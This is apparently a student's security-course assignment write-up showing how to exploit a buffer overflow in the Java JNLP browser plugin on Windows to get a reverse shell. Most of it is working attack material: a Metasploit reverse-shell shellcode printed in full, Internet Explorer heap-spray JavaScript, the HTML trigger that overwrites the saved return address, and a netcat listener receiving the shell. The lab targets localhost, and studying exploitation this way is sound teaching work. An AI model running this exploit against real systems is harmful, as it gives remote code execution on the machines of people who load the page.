# Assignment 2

Kevin Orr

In this assignment, we will take advantage in a buffer overflow vulnerability in
the Java JNLP plugin to obtain a reverse shell on a windows target.

## Generating payload in metasploit
For simplicity, the attacker will be listening on the same machine as the
victim, on port 2600:

    msf > use payload/windows/shell_reverse_tcp
    msf payload(shell_reverse_tcp) > options

    Module options (payload/windows/shell_reverse_tcp):

       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST                      yes       The listen address
       LPORT     4444             yes       The listen port

    msf payload(shell_reverse_tcp) > set LHOST 127.0.0.1
    LHOST => 127.0.0.1
    msf payload(shell_reverse_tcp) > set LPORT 2600
    LPORT => 2600
    msf payload(shell_reverse_tcp) > generate -t js_le
    // windows/shell_reverse_tcp - 324 bytes
    // http://www.metasploit.com
    // VERBOSE=false, LHOST=127.0.0.1, LPORT=2600,
    // ReverseAllowProxy=false, StagerRetryCount=10,
    // StagerRetryWait=5.0, ReverseListenerThreaded=false,
    // PrependMigrate=false, EXITFUNC=process,
    // InitialAutoRunScript=, AutoRunScript=
    %ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2
    c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318
    %u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0
    c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233
    %u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4
    050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%u007f%u0100%u0268%u0a00%u8928%u6ae6%u5610%u6857%ua599%u6174
    %ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%uf
    de2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5
    %u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u4
    7bb%u7213%u6a6f%u5300%ud5ff

## Crafting the exploit
First we must spray this shellcode into the heap. To circumvent ASLR, we want to
cover a very large chunk of memory with our shellcode, since we can't know
beforehand the exact address our shellcode starts. This also means that we will
want very large nop sleds. If increase the ratio of nop sled size to shellcode
size, this decreases the likelihood that we jump into the middle of our
shellcode, which will likely render it useless.

We construct our spray pattern of ~4MiB of nops followed by our shellcode:

    var nops = unescape("%u9090%u9090");
    var shellcode = unescape(
        '%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f' +
        '%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a' +
        '%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6' +
        '%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3' +
        '%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0' +
        '%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5' +
        '%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea' +
        '%ue0df%ud5ff%u6a97%u6805%u007f%u0100%u0268%u0a00%u8928%u6ae6%u5610%u6857%ua599' +
        '%u6174%ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900' +
        '%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400' +
        '%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff' +
        '%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb' +
        '%u0575%u47bb%u7213%u6a6f%u5300%ud5ff'
    );

    while (nops.length <= 0x100000 - shellcode.length)
        nops += nops;
    nops += shellcode;

Allocate an array and copy our spray pattern into it 200 times:

    var a = new Array();
    for (i=0; i<200; i++) {
        // IE JS engine seems to not realocate strings unless they're different
        a[i] = String.fromCharCode(i) + nops;        // For some reason it seems necessary to actually access the data

        // otherwise it doesn't seem to be sprayed
        a[i].substr(0, 4);
    }

Note that we changed the spray pattern slightly for each element in the array.
Namely, we prefix each spray pattern with one extra character that is different
for each array member. This is to avoid copy-on-right (COW) optimizations in the
IE javascript engine. We also must perform some kind of write operation on each
item, again to avoid optimizing away the 200 items' allocations. We do this by
calling `String.substr`.

Finally, the exploit trigger:

    function trigger() {
        // Our heap spray winds up somewhere in the 0x10000000 - 0x20000000
        // range, so let's chose the address 0x14141414
        var buf = '';
        for (i=0; i<440; i++)
            buf += '\x14';

        var htmlTags =
            "<object type='application/x-java-applet'>" +
            "<param name='launchjnlp' value='1'>" +
            "<param name='docbase' value='" + buf + "'>" +
            "</object>";

        document.write(htmlTags);
    }

This inserts new DOM elements that immediately cause the JNLP plugin to be
launched. The buffer overflow vulnerability in the JNLP plugin can let us
overwrite the saved EIP in one of its functions, so we can jump to our sprayed
shellcode.

The jump address of `0x14141414` was chosen for two reasons:

* The heap spray was producing reliable results in the `0x10000000` to
  `0x20000000` range
* Instead of guessing the exact size of the buffer overflow that was necessary
  to overwrite the saved EIP, if we instead make our jump target the same byte
  repeated, we can overshoot the saved EIP without endangering our exploit. This
  allows us to overestimate the buffer overflow size

## Testing the exploit

Having a `netcat` server listening on port 2600 on the "attacker's" machine:

    C:\Windows\system32>nc -l -p 2600

After loading the page in IE and clicking the button, we see this on the
attacker's machine:

    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation. All rights reserved.
